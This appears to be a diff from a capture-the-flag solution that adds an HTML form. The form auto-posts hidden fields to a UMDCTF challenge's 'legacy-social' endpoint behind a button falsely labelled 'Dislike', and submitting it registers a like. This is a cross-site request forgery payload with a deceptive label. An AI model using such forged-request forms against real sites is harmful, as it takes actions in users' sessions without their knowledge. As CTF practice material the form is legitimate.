@@ -1,0 +1,13 @@
+<form action="https://a-minecraft-movie-api.challs.umdctf.io/legacy-social" method="POST">
+  <input type="hidden" name="sessionNumber" value="1"/>
+  <input type="hidden" name="postId" value="6452bd02-a34f-44aa-95c6-0088397dadaa"/>
+  <input type="hidden" name="likes" value="1"/>
+  <button
+    id="dislike-button"
+    class="cursor-pointer px-3 py-1 text-sm font-medium text-white bg-red-500 
+           rounded-md hover:bg-red-600 transition"
+    type="submit"
+  >
+    👎 Dislike
+  </button>
+</form>
